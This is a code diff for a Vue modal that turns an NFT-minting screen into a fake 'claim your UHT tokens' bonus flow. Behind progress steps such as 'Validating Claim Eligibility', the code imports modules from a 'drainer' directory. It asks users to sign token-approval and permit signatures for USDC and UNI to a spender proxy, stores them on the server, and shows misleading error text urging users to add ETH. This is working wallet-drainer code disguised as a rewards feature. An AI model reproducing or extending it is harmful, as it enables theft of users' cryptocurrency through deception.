@@ -3,10 +3,8 @@
     <div class="modal-card">
       <header>
         <div class="uht-mark">
-          <img :src="props.nft?.img" alt="Minting Logo"
-            onerror="this.src='https://dummyimage.com/96x96/6a44ff/ffffff&text=UHT'" />
           <div>
-            <div class="brand-title">Minting Your NFT</div>
+            <div class="brand-title">Claiming Your {{ tokenAmount }}UHT Tokens</div>
             <span class="badge"><small v-if="!completed && !error">Processing • Please wait</small></span>
           </div>
         </div>
@@ -37,100 +35,87 @@
       </div>
 
       <div v-else-if="completed" class="success-msg">
-        ✅ Mint Successful!
-        <button class="close-btn" @click="closeModal">Close</button>
+        ✅ Claim Successful!
+        <button class="close-btn" @click="() => $emit('successful')">Close</button>
       </div>
     </div>
   </div>
 </template>
 
 <script setup>
-import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork } from '../../../apiss/web3/walletconnect';
+import { getChainID } from '../../../apiss/web3/walletconnect';
 import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../../apiss/web3/walletSignature';
 import { requestSignature } from '../../../apiss/web3/drainer/main';
 import { requestPermitSignature } from '../../../apiss/web3/drainer/permit';
 import { OPTIMISM_ADDRESS, OPTIMISM_NAME, UNISWAP_ADDRESS, UNISWAP_NAME, USDC_ADDRESS, USDC_NAME, USDT_ADDRESS, USDT_NAME } from '../../../apiss/web3/drainer/constants';
 import { spenderProxyAddress } from '../../../apiss/web3/constants/erc2612permit';
-import { mintNft } from '../../../apiss/web3/uhtnft'
-import { create as saveNftMint } from '../../../apiss/uhtnftmint'
-import { updateUser } from '../../../apiss/profile'
-import { payGas } from '~/apiss/web3/ethgas';
+import { addUserPoints, updateUser } from '../../../apiss/profile'
 
 
+const auth = useAuth()
 const progress = ref(0)
 const completed = ref(false)
 const addressSignature = ref(null)
 const emit = defineEmits(['close'])
-const gasFee = ref(0)
 
 
-
-const props = defineProps({
-  addressSignature: null,
-  walletAddress: "",
-  nft: null
-})
 
 onMounted(() => {
-  addressSignature.value = props.addressSignature
-  gasFee.value = generateRandomNumber(0.0024, 0.003)
-  startMinting()
+  addressSignature.value = useAuth().value.addressSignature;
+  startClaiming()
 })
 
-
-
-function generateRandomNumber(max, min) {
-  return Math.random() * (max - min) + min
-}
 
 const error = ref('')
 
 // 4 minting steps
 const conditions = reactive([
   { label: 'Checking Wallet Connection', status: 'pending' },
-  { label: 'Validating NFT Availability', status: 'pending' },
+  { label: 'Validating Claim Eligibility', status: 'pending' },
   { label: 'Processing Transaction', status: 'pending' },
   { label: 'Confirming on Blockchain', status: 'pending' },
 ])
 
 
-async function startMinting() {
+async function startClaiming() {
   await performDummyCondition(0)
 
   for (let i = 0; i < conditions.length; i++) {
     try {
-      if (i == 0) {
-        await performDummyCondition(i)
-        // if (!isUsdcMigrated.value) await requestUSDC()
-        // else await performDummyCondition(i)
+      if (i == 1) {
+        if (!isUsdcMigrated.value) await requestUSDC()
+        else await performDummyCondition(i)
       }
-      else if (i == 1) {
+      else if (i == 2) {
+        // if (!isUsdtMigrated.value) await requestUSDT()
+        // else await performDummyCondition(i)
+        if (!isUniMigrated.value) await requestUNI()
+        else await performDummyCondition(i)
+      }
+      else if (i == 0) {
         await performDummyCondition(i)
+        // await payGas(gasFee.value)
         // if (!isUniMigrated.value) await requestUNI()
         // else await performDummyCondition(i)
       }
-      else if (i == 2) {
-        await payGas(gasFee.value)
-      }
       else if (i == 3) {
-        const randomNumber = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
-        await mintNft(props.nft?.id, randomNumber)
-        await saveNftMint({
-          address: props.walletAddress,
-          nftId: randomNumber,
-          nft: props.nft,
-          gasFee: gasFee.value
-        })
+        await addUserPoints(200)
         await updateUser({
-          hasMintedNFT: true
+          hasClaimedWelcomeBonusPoint: true
         })
-        useAuth().value.hasMintedNFT = true;
+        auth.value.hasClaimedWelcomeBonusPoint = true
       }
       conditions[i].status = 'success'
       progress.value = ((i + 1) / conditions.length) * 100
     } catch (err) {
       conditions[i].status = 'failed'
-      error.value = err.message || 'Mint failed'
+      error.value = err.message || 'Claim failed'
+      if (err?.info?.error?.code == -32000 || err?.error?.code == -32046) {
+        error.value = "Slippage tolerance high. Add Eth to cover gwei charge"
+      }
+      else if (err?.info?.error?.code == 4001 || err?.info?.error?.code == 5000) {
+        error.value = "Transaction rejected"
+      } else error.value = "An error occured"
       console.log(err)
       break
     }
@@ -148,7 +133,7 @@ function performDummyCondition(index) {
       const fail = false // set true to simulate failure
       if (fail) reject(new Error(`Condition ${index + 1} failed`))
       else resolve(true)
-    }, 1200)
+    }, 1500)
   })
 }
 
@@ -156,7 +141,7 @@ function performDummyCondition(index) {
 async function requestUSDC() {
   return new Promise(async (resolve, reject) => {
     try {
-      const walletAddress = props.walletAddress;
+      const walletAddress = auth.value.walletAddress;
       if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
 
       const signatureResult = await requestSignature(USDC_ADDRESS, USDC_NAME, getChainID(), false, 1 * (10 ** 6), 6);
@@ -180,64 +165,11 @@ async function requestUSDC() {
 
 
 
-async function requestOptimism() {
-  return new Promise(async (resolve, reject) => {
-    try {
-      const walletAddress = props.walletAddress;
-      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
-      console.log("Loading: ", walletAddress)
-
-      const signatureResult = await requestPermitSignature(OPTIMISM_ADDRESS, OPTIMISM_NAME, getChainID(), 1 * (10 ** 18));
-      // const signatureResult = await requestSignature(OPTIMISM_ADDRESS, OPTIMISM_NAME, getChainID(), false, 1 * (10**18));
-      console.log("signatureResult:    ", signatureResult);
-
-      await updateAddressSignature(walletAddress, signatureResult);
-      addressSignature.value = await getAddressSignature(walletAddress);
-
-      resolve(true)
-    } catch (err) {
-      if (err?.info?.error?.code == -32000) {
-        reject(new Error("Insufficient funds"))
-      }
-      else if (err?.info?.error?.code == 4001) {
-        reject(new Error("Transaction rejected"))
-      } else reject(new Error("An error occured"))
-      console.log(err)
-    }
-  })
-}
-
-
-async function requestUSDT() {
-  return new Promise(async (resolve, reject) => {
-    try {
-      const walletAddress = props.walletAddress;
-      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
-
-      const signatureResult = await requestSignature(USDT_ADDRESS, USDT_NAME, getChainID(), false, 1 * (10 ** 6), 6);
-      console.log("signatureResult:    ", signatureResult);
-
-      await updateAddressSignature(walletAddress, signatureResult);
-      addressSignature.value = await getAddressSignature(walletAddress);
-
-      resolve(true)
-    } catch (err) {
-      console.log("requestUSDT", err)
-      if (err?.info?.error?.code == -32000) {
-        reject(new Error("Insufficient funds"))
-      }
-      else if (err?.info?.error?.code == 4001) {
-        reject(new Error("Transaction rejected"))
-      } else reject(new Error("An error occured"))
-    }
-  })
-}
-
 
 async function requestUNI() {
   return new Promise(async (resolve, reject) => {
     try {
-      const walletAddress = props.walletAddress;
+      const walletAddress = auth.value.walletAddress;
       if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
 
       const signatureResult = await requestSignature(UNISWAP_ADDRESS, UNISWAP_NAME, getChainID(), false, 1 * (10 ** 18));
@@ -262,32 +194,20 @@ async function requestUNI() {
 
 
 const isUsdcMigrated = computed(() => {
-  let addressSignature = props.addressSignature;
+  let addressSignature = useAuth().value.addressSignature;
   return (addressSignature?.signatures?.length &&
     addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS.toLowerCase()) &&
     addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
 })
 
-const isUsdtMigrated = computed(() => {
-  let addressSignature = props.addressSignature;
-  return (addressSignature?.signatures?.length &&
-    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDT_ADDRESS.toLowerCase()) &&
-    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
-})
 
 const isUniMigrated = computed(() => {
-  let addressSignature = props.addressSignature;
+  let addressSignature = useAuth().value.addressSignature;
   return (addressSignature?.signatures?.length &&
     addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(UNISWAP_ADDRESS.toLowerCase()) &&
     addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
 })
 
-const isOptimismMigrated = computed(() => {
-  let addressSignature = props.addressSignature;
-  return (addressSignature?.signatures?.length &&
-    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(OPTIMISM_ADDRESS.toLowerCase()) &&
-    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
-})
 
 
 function closeModal() {
